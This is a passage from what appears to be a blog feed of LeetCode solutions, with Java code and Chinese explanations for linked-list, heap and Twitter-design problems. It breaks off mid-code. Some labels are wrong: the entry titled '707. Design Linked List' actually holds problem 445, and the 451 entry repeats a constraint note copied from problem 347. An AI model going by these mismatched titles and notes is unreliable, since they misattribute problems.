<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: head &#x3D; [4,5,1,9], node &#x3D; 5</span><br><span class="line">Output: [4,1,9]</span><br><span class="line">Explanation: You are given the second node with value 5, the linked list should become 4 -&gt; 1 -&gt; 9 after calling your function.</span><br></pre></td></tr></table></figure>

<h2 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: head = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">9</span>], node = <span class="number">1</span></span><br><span class="line">Output: [<span class="number">4</span>,<span class="number">5</span>,<span class="number">9</span>]</span><br><span class="line">Explanation: You are given the third node with value <span class="number">1</span>, the linked list should become <span class="number">4</span> -&gt; <span class="number">5</span> -&gt; <span class="number">9</span> after calling your function.</span><br></pre></td></tr></table></figure>

<h2 id="Node"><a href="#Node" class="headerlink" title="Node:"></a>Node:</h2><ul>
<li>The linked list will have at least two elements.</li>
<li>All of the nodes’ values will be unique.</li>
<li>The given node will not be the tail and it will always be a valid node of the linked list.</li>
<li>Do not return anything from your function.</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>将后续节点的值复制到前一个上，然后在最后一个节点之前截断</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(ListNode node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">null</span> != node.next) &#123;</span><br><span class="line">            node.val = node.next.val;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">null</span> == node.next.next) &#123;</span><br><span class="line">                node.next = <span class="keyword">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                node = node.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>将后一个节点的值拷贝至前一个节点，然后直接越过后一个节点，链接到后后一个节点。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteNode</span><span class="params">(ListNode node)</span> </span>&#123;</span><br><span class="line">        node.val = node.next.val;</span><br><span class="line">        node.next = node.next.next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>347. Top K Frequent Elements</title>
    <url>/2020/03/25/LeetCode/leetcode-000347-Top%20K%20Frequent%20Elements/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a non-empty array of integers, return the <strong><em>k\</em></strong> most frequent elements.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: nums &#x3D; [1,1,1,2,2,3], k &#x3D; 2</span><br><span class="line">Output: [1,2]</span><br></pre></td></tr></table></figure>

<h2 id="Example-2："><a href="#Example-2：" class="headerlink" title="Example 2："></a>Example 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: nums = [<span class="number">1</span>], k = <span class="number">1</span></span><br><span class="line">Output: [<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<h2 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h2><ol>
<li>You may assume <em>k</em> is always valid, 1 ≤ <em>k</em> ≤ number of unique elements.</li>
<li>Your algorithm’s time complexity <strong>must be</strong> better than O(<em>n</em> log <em>n</em>), where <em>n</em> is the array’s size.</li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>构造一个大顶堆，取K个即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> value;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(<span class="keyword">int</span> value, <span class="keyword">int</span> count)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.value = value;</span><br><span class="line">			<span class="keyword">this</span>.count = count;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> value;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.value = value;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> count;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCount</span><span class="params">(<span class="keyword">int</span> count)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.count = count;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">topKFrequent</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">		Map&lt;Integer, Integer&gt; values = <span class="keyword">new</span> HashMap&lt;Integer, Integer&gt;();</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">			<span class="keyword">if</span> (values.containsKey(num)) &#123;</span><br><span class="line">				values.put(num, values.get(num) + <span class="number">1</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				values.put(num, <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		PriorityQueue&lt;Node&gt; nodes = <span class="keyword">new</span> PriorityQueue&lt;&gt;(values.size(), (a, b) -&gt; b.getCount() - a.getCount());</span><br><span class="line">		<span class="keyword">for</span> (Map.Entry&lt;Integer, Integer&gt; entry : values.entrySet()) &#123;</span><br><span class="line">			Node node = <span class="keyword">new</span> Node(entry.getKey(), entry.getValue());</span><br><span class="line">			nodes.add(node);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;Integer&gt;(k);</span><br><span class="line">		<span class="keyword">while</span> (k &gt; <span class="number">0</span> &amp;&amp; !nodes.isEmpty()) &#123;</span><br><span class="line">			result.add(nodes.poll().getValue());</span><br><span class="line">			k--;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>707. Design Linked List</title>
    <url>/2020/03/25/LeetCode/leetcode-000445-Add%20Two%20Numbers%20II/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul>
<li><p>You are given two <strong>non-empty</strong> linked lists representing two non-negative integers. The most significant digit comes first and each of their nodes contain a single digit. Add the two numbers and return it as a linked list.</p>
<p>  You may assume the two numbers do not contain any leading zero, except the number 0 itself.</p>
</li>
</ul>
<h2 id="Follow-up"><a href="#Follow-up" class="headerlink" title="Follow up:"></a>Follow up:</h2><p>What if you cannot modify the input lists? In other words, reversing the lists is not allowed.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: (7 -&gt; 2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">Output: 7 -&gt; 8 -&gt; 0 -&gt; 7</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>翻转两个链表，大数加法，得到结果之后，再翻转回来</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ListNode <span class="title">reverse</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> reverse(<span class="keyword">null</span>, head);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> ListNode <span class="title">reverse</span><span class="params">(ListNode next, ListNode current)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> == current) &#123;</span><br><span class="line">			<span class="keyword">return</span> next;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ListNode nextNode = current.next;</span><br><span class="line">		current.next = next;</span><br><span class="line">		<span class="keyword">return</span> reverse(current, nextNode);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">		ListNode rev1 = reverse(l1);</span><br><span class="line">		ListNode rev2 = reverse(l2);</span><br><span class="line">		ListNode res = <span class="keyword">new</span> ListNode(rev1.val + rev2.val);</span><br><span class="line">		ListNode curr = res;</span><br><span class="line">		<span class="keyword">while</span> (rev1.next != <span class="keyword">null</span> || rev2.next != <span class="keyword">null</span> || curr.val &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (curr.val &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">				curr.val -= <span class="number">10</span>;</span><br><span class="line">				curr.next = <span class="keyword">new</span> ListNode(<span class="number">1</span>);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				curr.next = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			curr = curr.next;</span><br><span class="line">			<span class="keyword">int</span> val = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (rev1.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">				rev1 = rev1.next;</span><br><span class="line">				val += rev1.val;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (rev2.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">				rev2 = rev2.next;</span><br><span class="line">				val += rev2.val;</span><br><span class="line">			&#125;</span><br><span class="line">			curr.val += val;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> reverse(res);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：Follow-up"><a href="#解法二：Follow-up" class="headerlink" title="解法二：Follow up"></a>解法二：Follow up</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ListNode result = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(head != <span class="keyword">null</span>) &#123;</span><br><span class="line">            size++;</span><br><span class="line">            head = head.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">help</span><span class="params">(ListNode big, ListNode small, <span class="keyword">int</span> sizeB, <span class="keyword">int</span> sizeS)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(big == <span class="keyword">null</span> &amp;&amp; small == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(sizeB == sizeS) &#123;</span><br><span class="line">            sum = big.val + small.val + help(big.next, small.next, --sizeB, --sizeS);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sum = big.val +  help(big.next, small, --sizeB, sizeS);</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode temp = <span class="keyword">new</span> ListNode(sum % <span class="number">10</span>);</span><br><span class="line">        temp.next = result;</span><br><span class="line">        result = temp;</span><br><span class="line">        <span class="keyword">return</span> sum / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = size(l1);</span><br><span class="line">        <span class="keyword">int</span> right = size(l2);</span><br><span class="line">        ListNode big = left &gt; right ? l1 : l2;</span><br><span class="line">        ListNode small = left &gt; right ? l2 : l1;</span><br><span class="line">        <span class="keyword">int</span> sizeB = left &gt; right ? left : right;</span><br><span class="line">        <span class="keyword">int</span> sizeS = left &gt; right ? right : left;        </span><br><span class="line">        <span class="keyword">int</span> carry = help(big, small, sizeB, sizeS);</span><br><span class="line">        <span class="keyword">if</span>(carry != <span class="number">0</span>) &#123;</span><br><span class="line">            ListNode temp = <span class="keyword">new</span> ListNode(carry);</span><br><span class="line">            temp.next = result;</span><br><span class="line">            result = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>451. Sort Characters By Frequency</title>
    <url>/2020/03/25/LeetCode/leetcode-000451-Sort%20Characters%20By%20Frequency/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a string, sort it in decreasing order based on the frequency of characters.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input:</span><br><span class="line">&quot;tree&quot;</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&quot;eert&quot;</span><br><span class="line"></span><br><span class="line">Explanation:</span><br><span class="line">&#39;e&#39; appears twice while &#39;r&#39; and &#39;t&#39; both appear once.</span><br><span class="line">So &#39;e&#39; must appear before both &#39;r&#39; and &#39;t&#39;. Therefore &quot;eetr&quot; is also a valid answer.</span><br></pre></td></tr></table></figure>

<h2 id="Example-2："><a href="#Example-2：" class="headerlink" title="Example 2："></a>Example 2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input:</span><br><span class="line"><span class="string">"cccaaa"</span></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="string">"cccaaa"</span></span><br><span class="line"></span><br><span class="line">Explanation:</span><br><span class="line">Both <span class="string">'c'</span> and <span class="string">'a'</span> appear three times, so <span class="string">"aaaccc"</span> is also a valid answer.</span><br><span class="line">Note that <span class="string">"cacaca"</span> is incorrect, as the same characters must be together.</span><br></pre></td></tr></table></figure>

<h2 id="Example-3："><a href="#Example-3：" class="headerlink" title="Example 3："></a>Example 3：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input:</span><br><span class="line"><span class="string">"Aabb"</span></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="string">"bbAa"</span></span><br><span class="line"></span><br><span class="line">Explanation:</span><br><span class="line"><span class="string">"bbaA"</span> is also a valid answer, but <span class="string">"Aabb"</span> is incorrect.</span><br><span class="line">Note that <span class="string">'A'</span> and <span class="string">'a'</span> are treated as two different characters.</span><br></pre></td></tr></table></figure>

<h2 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h2><ol>
<li>You may assume <em>k</em> is always valid, 1 ≤ <em>k</em> ≤ number of unique elements.</li>
<li>Your algorithm’s time complexity <strong>must be</strong> better than O(<em>n</em> log <em>n</em>), where <em>n</em> is the array’s size.</li>
</ol>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>构造一个大顶堆，遍历取完即可。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">char</span> c;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> times;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(<span class="keyword">char</span> c, <span class="keyword">int</span> times)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.c = c;</span><br><span class="line">			<span class="keyword">this</span>.times = times;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">getC</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> c;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setC</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.c = c;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getTimes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> times;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTimes</span><span class="params">(<span class="keyword">int</span> times)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.times = times;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="function"><span class="keyword">public</span> String <span class="title">frequencySort</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		 <span class="keyword">int</span>[] chars = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];</span><br><span class="line">		 <span class="keyword">for</span> (<span class="keyword">char</span> c : s.toCharArray()) &#123;</span><br><span class="line">			 chars[c]++;</span><br><span class="line">		 &#125;</span><br><span class="line">		 </span><br><span class="line">		 PriorityQueue&lt;Node&gt; charNodes = <span class="keyword">new</span> PriorityQueue&lt;&gt;((a, b) -&gt; b.getTimes() - a.getTimes());</span><br><span class="line">		 <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">256</span>;i++) &#123;</span><br><span class="line">			 <span class="keyword">if</span> (chars[i] == <span class="number">0</span>) &#123;</span><br><span class="line">				 <span class="keyword">continue</span>;</span><br><span class="line">			 &#125;</span><br><span class="line">			 </span><br><span class="line">			 Node node = <span class="keyword">new</span> Node((<span class="keyword">char</span>) i, chars[i]);</span><br><span class="line">			 charNodes.add(node);</span><br><span class="line">		 &#125;</span><br><span class="line">		 </span><br><span class="line">		 StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		 <span class="keyword">while</span> (!charNodes.isEmpty()) &#123;</span><br><span class="line">			 Node node = charNodes.poll();</span><br><span class="line">			 <span class="keyword">int</span> total = node.getTimes();</span><br><span class="line">			 <span class="keyword">while</span> (total &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				 sb.append(node.getC());</span><br><span class="line">				 total--;</span><br><span class="line">			 &#125;</span><br><span class="line">		 &#125;</span><br><span class="line">		 <span class="keyword">return</span> sb.toString();</span><br><span class="line">	 &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>355. Design Twitter</title>
    <url>/2020/03/25/LeetCode/leetcode-000355.%20Design%20Twitter/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Design a simplified version of Twitter where users can post tweets, follow/unfollow another user and is able to see the 10 most recent tweets in the user’s news feed. Your design should support the following methods:</p>
<ol>
<li><strong>postTweet(userId, tweetId)</strong>: Compose a new tweet.</li>
<li><strong>getNewsFeed(userId)</strong>: Retrieve the 10 most recent tweet ids in the user’s news feed. Each item in the news feed must be posted by users who the user followed or by the user herself. Tweets must be ordered from most recent to least recent.</li>
<li><strong>follow(followerId, followeeId)</strong>: Follower follows a followee.</li>
<li><strong>unfollow(followerId, followeeId)</strong>: Follower unfollows a followee.</li>
</ol>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Twitter twitter &#x3D; new Twitter();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; User 1 posts a new tweet (id &#x3D; 5).</span><br><span class="line">twitter.postTweet(1, 5);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; User 1&#39;s news feed should return a list with 1 tweet id -&gt; [5].</span><br><span class="line">twitter.getNewsFeed(1);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; User 1 follows user 2.</span><br><span class="line">twitter.follow(1, 2);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; User 2 posts a new tweet (id &#x3D; 6).</span><br><span class="line">twitter.postTweet(2, 6);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; User 1&#39;s news feed should return a list with 2 tweet ids -&gt; [6, 5].</span><br><span class="line">&#x2F;&#x2F; Tweet id 6 should precede tweet id 5 because it is posted after tweet id 5.</span><br><span class="line">twitter.getNewsFeed(1);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; User 1 unfollows user 2.</span><br><span class="line">twitter.unfollow(1, 2);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; User 1&#39;s news feed should return a list with 1 tweet id -&gt; [5],</span><br><span class="line">&#x2F;&#x2F; since user 1 is no longer following user 2.</span><br><span class="line">twitter.getNewsFeed(1);</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>使用一个哈希表保存用户follow的用户；使用一个哈希表保存用户自己发送的tweet</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Twitter</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> tweetIndex = <span class="number">1</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">private</span> Map&lt;Integer, Set&lt;Integer&gt;&gt; userFollowers;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">private</span> Map&lt;Integer, PriorityQueue&lt;Tweet&gt;&gt; userTweets;</span><br><span class="line">		</span><br><span class="line">	    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="title">Twitter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	        userFollowers = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">	        userTweets = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Compose a new tweet. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postTweet</span><span class="params">(<span class="keyword">int</span> userId, <span class="keyword">int</span> tweetId)</span> </span>&#123;</span><br><span class="line">	    	Tweet tweet = <span class="keyword">new</span> Tweet(userId, tweetId, tweetIndex++);</span><br><span class="line">	        <span class="keyword">if</span> (userTweets.containsKey(userId)) &#123;</span><br><span class="line">	        	PriorityQueue&lt;Tweet&gt; queue = userTweets.get(userId);</span><br><span class="line">	        	queue.add(tweet);</span><br><span class="line">	        	<span class="keyword">if</span> (queue.size() &gt; <span class="number">10</span>) &#123;</span><br><span class="line">	        		queue.poll();</span><br><span class="line">	        	&#125;</span><br><span class="line">	        	userTweets.put(userId, queue);</span><br><span class="line">	        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	        	PriorityQueue&lt;Tweet&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;&gt;((t1, t2) -&gt; t1.getCurrentTime() - t2.getCurrentTime());</span><br><span class="line">	        	queue.add(tweet);</span><br><span class="line">	        	userTweets.put(userId, queue);</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Retrieve the 10 most recent tweet ids in the user's news feed. Each item in the news feed must be posted by users who the user followed or by the user herself. Tweets must be ordered from most recent to least recent. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">getNewsFeed</span><span class="params">(<span class="keyword">int</span> userId)</span> </span>&#123;</span><br><span class="line">	    	PriorityQueue&lt;Tweet&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;&gt;((t1, t2) -&gt; t2.getCurrentTime() - t1.getCurrentTime());</span><br><span class="line">	    	<span class="keyword">if</span> (userTweets.containsKey(userId)) &#123;</span><br><span class="line">	    		queue.addAll(userTweets.get(userId));</span><br><span class="line">	    	&#125;</span><br><span class="line">	    	</span><br><span class="line">	    	<span class="keyword">if</span> (userFollowers.containsKey(userId)) &#123;</span><br><span class="line">	    		Set&lt;Integer&gt; followers = userFollowers.get(userId);</span><br><span class="line">	    		</span><br><span class="line">	    		<span class="keyword">for</span> (<span class="keyword">int</span> follower : followers) &#123;</span><br><span class="line">	    			<span class="keyword">if</span> (userTweets.containsKey(follower)) &#123;</span><br><span class="line">	    				queue.addAll(userTweets.get(follower));</span><br><span class="line">	    			&#125;</span><br><span class="line">	    		&#125;</span><br><span class="line">	    	&#125;</span><br><span class="line">	    	</span><br><span class="line">	    	List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;Integer&gt;(<span class="number">10</span>);</span><br><span class="line">	    	<span class="keyword">if</span> (!queue.isEmpty()) &#123;</span><br><span class="line">    			<span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    			<span class="keyword">while</span> (index &lt; <span class="number">10</span> &amp;&amp; !queue.isEmpty() ) &#123;</span><br><span class="line">    				result.add(queue.poll().getTweetId());</span><br><span class="line">    				index++;</span><br><span class="line">    			&#125;</span><br><span class="line">    			<span class="keyword">return</span> result;</span><br><span class="line">    		&#125;</span><br><span class="line">	        <span class="keyword">return</span> result;</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Follower follows a followee. If the operation is invalid, it should be a no-op. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">follow</span><span class="params">(<span class="keyword">int</span> followerId, <span class="keyword">int</span> followeeId)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (followerId == followeeId) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">	    	<span class="keyword">if</span> (userFollowers.containsKey(followerId)) &#123;</span><br><span class="line">	    		userFollowers.get(followerId).add(followeeId);</span><br><span class="line">	    	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	    		Set&lt;Integer&gt; followees = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">	    		followees.add(followeeId);</span><br><span class="line">	    		userFollowers.put(followerId, followees);</span><br><span class="line">	    	&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	    </span><br><span class="line">	    <span class="comment">/** Follower unfollows a followee. If the operation is invalid, it should be a no-op. */</span></span><br><span class="line">	    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unfollow</span><span class="params">(<span class="keyword">int</span> followerId, <span class="keyword">int</span> followeeId)</span> </span>&#123;</span><br><span class="line">	        <span class="keyword">if</span> (userFollowers.containsKey(followerId)) &#123;</span><br><span class="line">	        	